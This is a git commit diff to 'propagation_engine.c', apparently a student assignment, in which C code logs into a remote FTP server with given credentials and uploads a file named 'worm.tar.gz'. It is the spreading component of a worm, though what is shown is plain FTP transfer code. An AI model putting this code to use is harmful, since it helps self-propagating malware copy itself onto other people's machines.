f2aac2c2eb546724efdb4e1344323e3bc24aa97e
KathLouise <kathe.nightwish@gmail.com>
2016-11-14 14:56:27 -0200

    PE em 50%

--- propagation_engine.c
+++ propagation_engine.c
@@ -58,11 +58,11 @@ void parseIPPort(char buffer[], char *ip, int *port){
 }
 
 void fileTransfer(char *ip, char *username, char *password){
-    char buffer[1024], file_buf[4096], toSend[1];
+    char buffer[1024];
     char *ipT = (char*) malloc(sizeof(char));
     char user[100] = "USER ";
     char pass[100] = "PASS ";
-    char model[10] = "MODE S\n";
+    char model[10] = "MODE C\n";
     char type[10] = "TYPE I\n";
     char stru[10] = "STRU F\n";
     char pasv[10] = "PASV\n";
@@ -70,14 +70,12 @@ void fileTransfer(char *ip, char *username, char *password){
     char cwdWD[100] = "CWD Asgn03KLG/\n";
     char pwd[10] = "PWD\n";
     char mkd[20] = "MKD Asgn03KLG\n";
-    char storWorm[25] = "STOR worm.c\n";
-    char c;
-    DIR *dir;
-    FILE *arq;
-    int i = 0, sent, tam_send = 0, temp, sock = 0, sockT, len = 0, status, port = 0, accept_socket, count1 = 1, count2 = 1, fileSize;
+    char quit[10] = "QUIT\n";
+    char stor[20] = "STOR worm.tar.gz\n";
+    char file[20] = "worm.tar.gz";
+    int sent, sock = 0, sockT = 0, status = 0, port = 0, accept_socket, fileSize = 0;
     off_t offset = 0; //file offset
-    struct sockaddr_in serverAddr, transfSock, server;
-    struct dirent *folder;
+    struct sockaddr_in serverAddr, transfSock;
     struct stat obj;
 
     //CONNECT FTP
@@ -215,9 +213,9 @@ void fileTransfer(char *ip, char *username, char *password){
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
     
-    //Enviando comando Worm.c
+    //Enviando comando STRO
     memset(buffer, '0', 1024);
-    send(sock, storWorm, strlen(storWorm), 0);
+    send(sock, stor, strlen(stor), 0);
 
     //CONNECT FTP
     sockT = socket(AF_INET, SOCK_STREAM, 0);
@@ -232,44 +230,53 @@ void fileTransfer(char *ip, char *username, char *password){
     transfSock.sin_port = htons(port);
 
     if(connect(sockT, (struct sockaddr*)&transfSock, sizeof(transfSock)) < 0){
-        //printf("Erro: conexao falhou. \n");
-        perror("");
-        exit(1);
+         perror("");
+         exit(1);
     }
-    
+  
     bzero(buffer, 1024);
     recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
-    sent = open("worm.c", O_RDONLY);
+    sent = open(file, O_RDONLY);
 
-    //if((arq = fopen("worm.c", "r")) == NULL){
     if(sent < 0){
-        printf("No such file on the local directory\n\n");
+        printf("Arquivo não encontrado\n");
         exit(0);
     }
+        
     //get size of file
     fstat(sent, &obj);
     
     offset = 0;
     status =  sendfile(sockT, sent, &offset, obj.st_size);
     if(status < 0){ 
-        printf("error from sendfile\n\n");
+        printf("Não foi possivel fazer a transferencia\n");
         exit(1);
     }
 
     if (status != obj.st_size) {
-      printf("incomplete transfer from sendfile: %d of %d bytes\n", status, (int)obj.st_size);
-      exit(1);
+        printf("Transferencia incompleta: %d de %d bytes\n", status, (int)obj.st_size);
+        exit(1);
     }
     
+    close(sent);  
+    close(sockT);
+
+    //Resposta do 'STOR'
     bzero(buffer, 1024);
-    recv(sockT, buffer, sizeof(buffer), 0);
+    recv(sock, buffer, sizeof(buffer), 0);
+    printf("%s", buffer);
+    
+    //Enviando comando 'QUIT'
+    memset(buffer, '0', 1024);
+    send(sock, quit, strlen(quit), 0);
+    
+    //Resposta do 'QUIT'
+    bzero(buffer, 1024);
+    recv(sock, buffer, sizeof(buffer), 0);
     printf("%s", buffer);
 
-    close(sent);
-    
-    close(sockT);
     if(sock >= 0){
         close(sock);
     }
@@ -277,6 +284,6 @@ void fileTransfer(char *ip, char *username, char *password){
 
 void propagation_engine(char* ip, char *username, char *pass){
     
-    fileTransfer(ip, username, pass);
+        fileTransfer(ip, username, pass);
 
 }
